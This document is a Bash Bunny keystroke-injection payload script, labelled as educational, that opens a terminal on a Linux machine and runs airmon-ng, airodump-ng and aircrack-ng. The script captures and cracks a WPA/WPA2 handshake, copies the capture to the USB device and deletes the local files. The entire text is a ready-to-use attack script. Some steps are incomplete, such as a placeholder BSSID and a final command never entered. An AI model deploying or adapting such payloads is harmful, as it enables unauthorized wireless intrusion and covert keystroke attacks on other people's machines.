# Title: Wi-Fi Brute-force Simulation
# Description: Simulate a brute-force attack on WPA/WPA2 Wi-Fi networks in a controlled environment.
# Author: jjarque1
# Target: Linux
# Payload developed for educational purposes only

# Set up attack modes
ATTACKMODE HID STORAGE

# Delay to allow the system to recognize the USB device
QUACK DELAY 2000

# Open terminal (assumes shortcut Ctrl+Alt+T opens a terminal)
QUACK CTRL ALT t
QUACK DELAY 1000

# Start monitoring mode on wlan0
QUACK STRING sudo airmon-ng start wlan0
QUACK ENTER
QUACK DELAY 1000

# Capture WPA/WPA2 handshake (replace 'network_name' with your test SSID)
QUACK STRING sudo airodump-ng --bssid XX:XX:XX:XX:XX:XX -c 6 -w /tmp/capture wlan0
QUACK ENTER
QUACK DELAY 20000  # Adjust delay for the time needed to capture the handshake

# Attempt to crack the captured handshake using a wordlist
QUACK STRING sudo aircrack-ng -w /path/to/wordlist.txt /tmp/capture*.cap
QUACK ENTER
QUACK DELAY 15000  # Adjust based on wordlist size

# Copy the result to Bash Bunny storage
QUACK STRING cp /tmp/capture*.cap /media/$USER/BashBunny/wifi_bruteforce_handshake.cap
QUACK ENTER

# Clean up captured files
QUACK STRING rm /tmp/capture*.cap
